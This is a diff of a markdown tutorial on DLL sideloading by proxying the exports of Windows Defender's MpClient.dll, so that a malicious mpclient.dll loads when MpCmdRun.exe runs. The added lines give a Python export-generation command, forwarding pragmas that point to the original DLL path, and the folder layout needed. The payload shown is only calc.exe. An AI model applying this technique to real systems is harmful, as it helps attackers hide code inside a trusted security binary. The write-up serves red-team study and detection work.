@@ -183,10 +183,28 @@ The export functions will forward execution to the legitimate DLL, named "**mpcl
 
 Now compile your malicious DLL in Visual Studio or using `cl.exe` to the output file named **mpclient.dll**!
 
+#### An alternative method with Python
+
+Another technique to do DLL proxying, which is my preferred method, is to proxy DLL exports to the DLL on disk in its __original location__ (i.e. `C:\windows\system32`). That way you don't need to have the original DLL in the current folder of the executable and malicious DLL. These exports can be created with a similar [script in Python](https://gist.github.com/wsummerhill/ceebd6893b14244ef5a7f9dfd4348f0a)  which points the DLL exports to the full path of the DLL on disk instead of the DLL in the current folder.<br />
+For example:
+```
+python Find-DLL-Exports_DLL-Proxying.py "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2201.10-0\MpClient.dll"
+// Export DLL functions
+#pragma once
+#pragma comment(linker,"/export:MpAddDynamicSignatureFile=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2201.10-0\\MpClient.MpAddDynamicSignatureFile,@43")
+#pragma comment(linker,"/export:MpAllocMemory=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2201.10-0\\MpClient.MpAllocMemory,@44")
+#pragma comment(linker,"/export:MpAmsiCloseSession=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2201.10-0\\MpClient.MpAmsiCloseSession,@45")
+#pragma comment(linker,"/export:MpAmsiNotify=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2201.10-0\\MpClient.MpAmsiNotify,@46")
+#pragma comment(linker,"/export:MpAmsiScan=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2201.10-0\\MpClient.MpAmsiScan,@47")
+#pragma comment(linker,"/export:MpAsrSetHipsUserExclusion=C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2201.10-0\\MpClient.MpAsrSetHipsUserExclusion,@48")
+...
+
+
+```
 
 ### Putting it all together
 
-To combine everything together and actually execute our DLL sideload, we need to copy the **original EXE**, **malicious DLL**, and **original DLL** into the same folder. Place the following files to your target folder with these naming conventions: <br />
+To combine everything together and actually execute our DLL sideload with the PowerShell script with original DLL in the same folder, we need to copy the **original EXE**, **malicious DLL**, and **original DLL** to the same folder. Place the following files to your target folder with these naming conventions: <br />
 - MpCmdRun.exe
 - mpclient.dll (malicious DLL)
 - mpclient_orig.dll (original DLL)
@@ -198,4 +216,8 @@ It should look something like this:
 Finally, we can double-click or execute **MpCmdRun.exe** from command-line and we should see _calc.exe_ spawn in the foreground if it properly worked! Note for this executable, you may have to disable Defender first to get it working. But generally as a proof-of-concept we've shown that the DLL sideload via DLL proxying of Windows Defender works!
 
 ![image](https://user-images.githubusercontent.com/35749735/195417916-03906f38-3732-4943-869d-622c19965bc9.png)
+
+If we do this using the alternative method with Python [referenced above](#an-alternative-method-with-python) which proxies exports to the original DLL where it normally resides on disk, then our folder structure would look a bit different as it only requires the malicous DLL sideloading our EXE: <br />
+- MpCmdRun.exe
+- mpclient.dll (malicious DLL)
 
